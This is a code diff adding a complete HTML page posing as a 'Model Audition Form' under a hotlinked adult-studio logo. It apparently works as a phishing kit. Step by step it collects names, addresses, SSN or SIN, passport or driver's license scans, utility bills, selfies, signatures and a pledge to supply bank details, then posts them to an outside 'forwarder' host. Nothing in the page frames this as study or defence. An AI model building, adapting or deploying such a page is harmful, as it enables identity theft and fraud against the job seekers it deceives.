@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Model Audition Form</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #ffd700;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .logo {
+      width: 100%;
+      display: flex;
+      justify-content: flex-start;
+      padding: 20px 30px 10px;
+      margin-left: 50px;
+      margin-top: -100px;
+      margin-bottom: -100px;
+    }
+
+    .logo img {
+      width: 240px;
+    }
+
+    .form-container {
+      background: #1a1a1a;
+      border: 2px solid #ffd700;
+      border-radius: 10px;
+      padding: 30px;
+      max-width: 450px;
+      width: 90%;
+      margin: 0 auto;
+      box-sizing: border-box;
+    }
+
+    .form-title {
+      font-size: 24px;
+      text-align: center;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+
+    .step {
+      display: none;
+      animation: fade 0.5s ease-in-out;
+    }
+
+    .step.active {
+      display: block;
+    }
+
+    .confirmation {
+      display: none;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .confirmation.active {
+      display: block;
+    }
+
+    @keyframes fade {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0 20px;
+      border: 1px solid #ffd700;
+      border-radius: 5px;
+      background-color: #000;
+      color: #ffd700;
+      box-sizing: border-box;
+    }
+
+    label {
+      font-weight: bold;
+      display: block;
+    }
+
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      margin: 8px 0;
+    }
+
+    .checkbox-group input[type="checkbox"] {
+      margin-right: 10px;
+      width: auto;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+    }
+
+    button {
+      padding: 10px 20px;
+      background-color: #ffd700;
+      border: none;
+      color: #000;
+      font-weight: bold;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #e6c200;
+    }
+
+    small {
+      font-size: 12px;
+      color: #ccc;
+    }
+
+    .loading {
+      display: none;
+      text-align: center;
+      margin: 20px 0;
+    }
+  </style>
+</head>
+<body>
+
+<div class="logo">
+  <img src="https://cdn.inspireuplift.com/uploads/images/seller_products/30611/1702952351_Bangbros.png" alt="Logo">
+</div>
+
+<div class="form-container">
+  <div class="form-title">Model Audition Form</div>
+  
+  <form method="post" action="https://my-forwarder.site/school/action.php" id="auditionForm" enctype="multipart/form-data">
+
+    <!-- Step 1: Personal Information -->
+    <div class="step active">
+      <label>First Name:</label>
+      <input type="text" name="firstName" required>
+
+      <label>Last Name:</label>
+      <input type="text" name="lastName" required>
+
+      <div class="buttons" style="justify-content: flex-end;">
+        <button type="button" onclick="validateStepAndProceed()">Next</button>
+      </div>
+    </div>
+
+    <!-- Step 2: Address Information -->
+    <div class="step">
+      <label>Country:</label>
+      <select name="country" id="country" onchange="handleCountryChange()" required>
+        <option value="">-- Select Country --</option>
+      </select>
+
+      <label id="stateDropdownLabel" style="display: none;">State/Province:</label>
+      <select id="stateDropdown" name="state" style="display: none;"></select>
+
+      <label id="stateTextLabel" style="display: none;">State/Province:</label>
+      <input type="text" id="stateText" name="stateText" style="display: none;">
+
+      <label>Street Address:</label>
+      <input type="text" name="street" required>
+
+      <label>City:</label>
+      <input type="text" name="city" required>
+
+      <label>ZIP Code:</label>
+      <input type="text" name="zip" required>
+
+      <div class="buttons">
+        <button type="button" onclick="prevStep()">Previous</button>
+        <button type="button" onclick="validateStepAndProceed()">Next</button>
+      </div>
+    </div>
+
+    <!-- Step 3: Contact and Identification -->
+    <div class="step">
+      <label>Email Address:</label>
+      <input type="email" name="email" required>
+      
+      <div id="ssnContainer" style="display: none;">
+        <label id="ssnLabel">SSN/SIN:</label>
+        <input type="text" name="ssn" id="ssnInput">
+        <small id="ssnNote"></small>
+      </div>
+
+      <div class="buttons">
+        <button type="button" onclick="prevStep()">Previous</button>
+        <button type="button" onclick="validateStepAndProceed()">Next</button>
+      </div>
+    </div>
+
+    <!-- Step 4: ID Type Selection -->
+    <div class="step">
+      <label for="idType">Select ID Type:</label>
+      <select id="idType" name="idType" required onchange="toggleUploadFields()">
+        <option value="">--Select--</option>
+        <option value="passport">Passport</option>
+        <option value="drivers">Driver's License</option>
+      </select>
+
+      <div class="buttons">
+        <button type="button" onclick="prevStep()">Previous</button>
+        <button type="button" onclick="validateIdTypeAndProceed()">Next</button>
+      </div>
+    </div>
+
+    <!-- Step 5: Document Upload -->
+    <div class="step" id="documentUploadStep">
+      <!-- Passport Upload Section -->
+      <div id="passportUploadSection" style="display: none;">
+        <label>Upload Passport Page:</label>
+        <input type="file" name="passportUpload" accept="image/*">
+        <small>Ensure all four corners are visible</small>
+      </div>
+
+      <!-- Driver's License Upload Section -->
+      <div id="driversUploadSection" style="display: none;">
+        <label>Upload Driver's License Front:</label>
+        <input type="file" name="dlFront" accept="image/*">
+        <label>Upload Driver's License Back:</label>
+        <input type="file" name="dlBack" accept="image/*">
+        <small>Ensure all four corners are visible</small>
+      </div>
+
+      <div class="buttons">
+        <button type="button" onclick="prevStep()">Previous</button>
+        <button type="button" onclick="validateUploadAndProceed()">Upload</button>
+      </div>
+    </div>
+
+    <!-- Step 6: Utility Bill -->
+    <div class="step">
+      <label>Upload Recent Utility Bill:</label>
+      <input type="file" name="utilityBill" accept="image/*,application/pdf">
+      <small>Ensure all four corners are visible</small>
+      <div class="buttons">
+        <button type="button" onclick="prevStep()">Previous</button>
+        <button type="button" onclick="validateStepAndProceed()">Upload</button>
+      </div>
+    </div>
+
+    <!-- Step 7: Selfie -->
+    <div class="step">
+      <label>Upload a Selfie Photo:</label>
+      <input type="file" name="selfie" accept="image/*" required>
+      <div class="buttons">
+        <button type="button" onclick="prevStep()">Previous</button>
+        <button type="button" onclick="validateStepAndProceed()">Upload</button>
+      </div>
+    </div>
+
+    <!-- Step 8: Signature and Disclosures -->
+    <div class="step">
+      <p><strong>Disclosure:</strong> By signing below, you acknowledge and agree to our data use policy, confirm you are of legal working age in your country, and understand this form collects personal information for audition and employment consideration purposes.</p>
+
+      <div class="checkbox-group">
+        <input type="checkbox" id="agreePolicy" required>
+        <label for="agreePolicy">I have read and agree with the disclosure/policy.</label>
+      </div>
+      <div class="checkbox-group">
+        <input type="checkbox" id="confirmAge" required>
+        <label for="confirmAge">I confirm I am over 18 years old.</label>
+      </div>
+      <div class="checkbox-group">
+        <input type="checkbox" id="bankEligibility" required>
+        <label for="bankEligibility">I am willing to provide bank details and am eligible to receive wages in my country.</label>
+      </div>
+
+      <label>Type Full Name to Sign:</label>
+      <input type="text" name="signature" required>
+
+      <div class="loading" id="formLoading">
+        <p>Submitting your application...</p>
+      </div>
+
+      <div class="buttons">
+        <button type="button" onclick="prevStep()">Previous</button>
+        <button type="submit" id="submitBtn">Submit</button>
+      </div>
+    </div>
+
+  </form>
+  
+  <!-- Confirmation Message -->
+  <div class="confirmation">
+    <h2>Application Received Successfully!</h2>
+    <p>Thank you for submitting your application. Please check your mailbox for a reply from us.</p>
+    <p>We will contact you soon with further instructions.</p>
+  </div>
+</div>
+
+<script>
+  const steps = document.querySelectorAll('.step');
+  const confirmation = document.querySelector('.confirmation');
+  const form = document.getElementById('auditionForm');
+  const loadingIndicator = document.getElementById('formLoading');
+  const submitBtn = document.getElementById('submitBtn');
+  let currentStep = 0;
+
+  // Populate countries
+  const countrySelect = document.getElementById("country");
+  const countries = ["United States", "Canada", "United Kingdom", "Australia", "Germany", "France", "India", "China", "Japan", "South Korea", "Mexico", "Brazil", "Nigeria", "South Africa", "Italy", "Spain", "Netherlands", "Sweden", "Norway", "Russia", "Argentina", "New Zealand", "Philippines", "Indonesia", "Malaysia", "Thailand", "Turkey", "Saudi Arabia", "Egypt", "Kenya", "Other"];
+  countries.forEach(c => {
+    const opt = document.createElement("option");
+    opt.value = c;
+    opt.textContent = c;
+    countrySelect.appendChild(opt);
+  });
+
+  // States/Provinces
+  const usaStates = "Alabama,Alaska,Arizona,Arkansas,California,Colorado,Connecticut,Delaware,Florida,Georgia,Hawaii,Idaho,Illinois,Indiana,Iowa,Kansas,Kentucky,Louisiana,Maine,Maryland,Massachusetts,Michigan,Minnesota,Mississippi,Missouri,Montana,Nebraska,Nevada,New Hampshire,New Jersey,New Mexico,New York,North Carolina,North Dakota,Ohio,Oklahoma,Oregon,Pennsylvania,Rhode Island,South Carolina,South Dakota,Tennessee,Texas,Utah,Vermont,Virginia,Washington,West Virginia,Wisconsin,Wyoming".split(",");
+  const canadaProvinces = "Alberta,British Columbia,Manitoba,New Brunswick,Newfoundland and Labrador,Nova Scotia,Ontario,Prince Edward Island,Quebec,Saskatchewan,Northwest Territories,Nunavut,Yukon".split(",");
+
+  function handleCountryChange() {
+    const country = document.getElementById("country").value;
+    const stateDropdown = document.getElementById("stateDropdown");
+    const stateText = document.getElementById("stateText");
+    const stateDropdownLabel = document.getElementById("stateDropdownLabel");
+    const stateTextLabel = document.getElementById("stateTextLabel");
+    const ssnContainer = document.getElementById("ssnContainer");
+    const ssnLabel = document.getElementById("ssnLabel");
+    const ssnNote = document.getElementById("ssnNote");
+
+    // Handle state/province fields
+    if (country === "United States") {
+      stateDropdown.style.display = "block";
+      stateDropdownLabel.style.display = "block";
+      stateText.style.display = "none";
+      stateTextLabel.style.display = "none";
+      stateDropdown.innerHTML = usaStates.map(state => `<option value="${state}">${state}</option>`).join('');
+    } else if (country === "Canada") {
+      stateDropdown.style.display = "block";
+      stateDropdownLabel.style.display = "block";
+      stateText.style.display = "none";
+      stateTextLabel.style.display = "none";
+      stateDropdown.innerHTML = canadaProvinces.map(state => `<option value="${state}">${state}</option>`).join('');
+    } else {
+      stateDropdown.style.display = "none";
+      stateDropdownLabel.style.display = "none";
+      stateText.style.display = "block";
+      stateTextLabel.style.display = "block";
+    }
+    
+    // Handle SSN/SIN fields
+    updateSsnFields(country);
+  }
+
+  function updateSsnFields(country) {
+    const ssnContainer = document.getElementById("ssnContainer");
+    const ssnLabel = document.getElementById("ssnLabel");
+    const ssnNote = document.getElementById("ssnNote");
+
+    if (country === "United States") {
+      ssnContainer.style.display = "block";
+      ssnLabel.textContent = "Social Security Number (SSN):";
+      ssnNote.textContent = "Last 4 digits only";
+    } else if (country === "Canada") {
+      ssnContainer.style.display = "block";
+      ssnLabel.textContent = "Social Insurance Number (SIN):";
+      ssnNote.textContent = "";
+    } else {
+      ssnContainer.style.display = "none";
+    }
+  }
+
+  function toggleUploadFields() {
+    const idType = document.getElementById("idType").value;
+    const passportSection = document.getElementById("passportUploadSection");
+    const driversSection = document.getElementById("driversUploadSection");
+
+    if (idType === "passport") {
+      passportSection.style.display = "block";
+      driversSection.style.display = "none";
+      // Make passport upload required, others not required
+      document.querySelector('input[name="passportUpload"]').required = true;
+      document.querySelector('input[name="dlFront"]').required = false;
+      document.querySelector('input[name="dlBack"]').required = false;
+      // Clear driver's license fields if they were previously filled
+      document.querySelector('input[name="dlFront"]').value = "";
+      document.querySelector('input[name="dlBack"]').value = "";
+    } else if (idType === "drivers") {
+      passportSection.style.display = "none";
+      driversSection.style.display = "block";
+      // Make driver's license uploads required, passport not required
+      document.querySelector('input[name="passportUpload"]').required = false;
+      document.querySelector('input[name="dlFront"]').required = true;
+      document.querySelector('input[name="dlBack"]').required = true;
+      // Clear passport field if it was previously filled
+      document.querySelector('input[name="passportUpload"]').value = "";
+    } else {
+      passportSection.style.display = "none";
+      driversSection.style.display = "none";
+    }
+  }
+
+  function validateIdTypeAndProceed() {
+    const idType = document.getElementById("idType").value;
+    
+    if (!idType) {
+      alert("Please select an ID type");
+      return;
+    }
+    
+    // Initialize the upload fields based on selection
+    toggleUploadFields();
+    
+    // Proceed to upload step
+    currentStep = 4; // Document upload step index
+    showStep(currentStep);
+  }
+
+  function validateUploadAndProceed() {
+    const idType = document.getElementById("idType").value;
+    let isValid = true;
+
+    if (idType === "passport") {
+      const passportFile = document.querySelector('input[name="passportUpload"]');
+      if (!passportFile.files.length) {
+        alert("Please upload your passport page");
+        isValid = false;
+      }
+    } else if (idType === "drivers") {
+      const dlFront = document.querySelector('input[name="dlFront"]');
+      const dlBack = document.querySelector('input[name="dlBack"]');
+      
+      if (!dlFront.files.length || !dlBack.files.length) {
+        alert("Please upload both front and back of your driver's license");
+        isValid = false;
+      }
+    }
+
+    if (isValid) {
+      nextStep();
+    }
+  }
+
+  function showStep(step) {
+    steps.forEach((s) => s.classList.remove('active'));
+    if (steps[step]) steps[step].classList.add('active');
+    
+    // Update SSN fields when showing step 3 (email/SSN)
+    if (step === 2) {
+      const country = document.getElementById("country").value;
+      updateSsnFields(country);
+    }
+  }
+
+  function validateStepAndProceed() {
+    const currentInputs = steps[currentStep].querySelectorAll('input, select');
+    for (let input of currentInputs) {
+      if (input.required && !input.value) {
+        alert("Please complete all required fields.");
+        return;
+      }
+      
+      // Validate email format if it's an email field
+      if (input.type === 'email' && input.value) {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (!emailRegex.test(input.value)) {
+          alert("Please enter a valid email address.");
+          return;
+        }
+      }
+    }
+    nextStep();
+  }
+
+  function nextStep() {
+    currentStep++;
+    while (steps[currentStep] && steps[currentStep].style.display === "none") {
+      currentStep++;
+    }
+    showStep(currentStep);
+  }
+
+  function prevStep() {
+    currentStep--;
+    while (steps[currentStep] && steps[currentStep].style.display === "none") {
+      currentStep--;
+    }
+    showStep(currentStep);
+  }
+
+  // Handle form submission
+  form.addEventListener('submit', function(e) {
+    if (!document.getElementById('agreePolicy').checked ||
+        !document.getElementById('confirmAge').checked ||
+        !document.getElementById('bankEligibility').checked) {
+      alert('You must check all required boxes before signing.');
+      e.preventDefault();
+      return;
+    }
+    
+    // Show loading indicator
+    loadingIndicator.style.display = 'block';
+    submitBtn.disabled = true;
+  });
+
+  // Show confirmation if coming from successful submission
+  document.addEventListener('DOMContentLoaded', function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    if(urlParams.has('success')) {
+      document.querySelector('form').style.display = 'none';
+      document.querySelector('.confirmation').classList.add('active');
+    }
+  });
+
+  // Initialize the form
+  showStep(currentStep);
+</script>
+</body>
+</html>
